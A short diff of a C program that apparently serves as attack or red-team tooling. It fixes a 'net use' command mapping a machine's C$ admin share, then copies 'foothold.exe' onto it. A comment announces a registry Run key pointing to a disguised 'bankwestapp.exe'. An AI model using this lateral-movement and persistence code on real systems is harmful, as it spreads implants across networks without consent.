@@ -38,7 +38,7 @@ int main()
 
 //Create computer.txt content
 	system("echo SauravWindowsVi > c:\\Users\\saurav\\Temp\\computer.txt");
-	system("net use F: \\\\\sauravwindowsVi\\C$\\users\\saurav\\Desktop /user:saurav");
+	system("net use F: \\\\sauravwindowsVi\\C$\\users\\saurav\\Desktop /user:saurav");
 	system("copy c:\\users\\saurav\\Desktop\\foothold.exe f:");
     
 //Set registry runkey Value - point to bankwestapp.exe
